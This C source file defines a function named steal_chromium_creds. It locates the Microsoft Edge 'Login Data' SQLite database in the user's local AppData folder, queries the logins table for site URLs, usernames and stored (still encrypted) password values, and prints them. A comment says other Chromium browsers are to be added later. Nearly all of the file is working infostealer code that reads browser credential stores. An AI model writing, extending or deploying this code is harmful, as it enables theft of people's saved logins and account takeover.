// clang-format off
// knownfolders needs to be after shlobj
#include <shlobj.h>
#include <knownfolders.h>
// clang-format on
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>

#include "sqlite3.h"

int steal_chromium_creds() {
  PWSTR appDataPath = NULL;
  HRESULT hr;

  // Retrieve the path to the APPDATA directory
  hr = SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, &appDataPath);
  if (SUCCEEDED(hr)) {
    // Should be a parameter later so that we can do all chromium based
    // browsers
    const wchar_t *additionalPath =
        L"\\Microsoft\\Edge\\User Data\\Default\\Login Data";

    // length needed for full path
    size_t totalLength = wcslen(appDataPath) + wcslen(additionalPath) + 1;

    PWSTR fullPath = (PWSTR)malloc(totalLength * sizeof(wchar_t));
    if (fullPath) {
      // Concatenate the paths
      wcscpy(fullPath, appDataPath);
      wcscat(fullPath, additionalPath);

      wprintf(L"Full path: %ls\n", fullPath);

      //  Retreive encrypted logins from the sqlite database
      sqlite3 *db;
      int rc = sqlite3_open16(fullPath, &db);
      if (rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
      } else {
        // Prepare the SQL statement
        const char *query =
            "SELECT origin_url, username_value, password_value FROM logins;";
        sqlite3_stmt *statement;
        rc = sqlite3_prepare_v2(db, query, -1, &statement, 0);
        if (rc != SQLITE_OK) {
          fprintf(stderr, "Failed to execute statement: %s\n",
                  sqlite3_errmsg(db));
        } else {
          // Execute the SQL statement
          while ((rc = sqlite3_step(statement)) == SQLITE_ROW) {
            const unsigned char *origin_url = sqlite3_column_text(statement, 0);
            const unsigned char *username_value =
                sqlite3_column_text(statement, 1);
            const unsigned char *password_value =
                sqlite3_column_text(statement, 2);

            printf("Origin URL: %s\n", origin_url);
            printf("Username: %s\n", username_value);
            printf("Password: %s\n", password_value);
            printf("\n");
          }

          // TODO error handling
          sqlite3_finalize(statement);
        }

        sqlite3_close(db);
      }

      free(fullPath);
    }

    // Free the memory allocated by SHGetKnownFolderPath
    CoTaskMemFree(appDataPath);
  } else {
    printf("Failed to retrieve APPDATA path. Error code: %08lX\n", hr);
  }

  return 0;
}
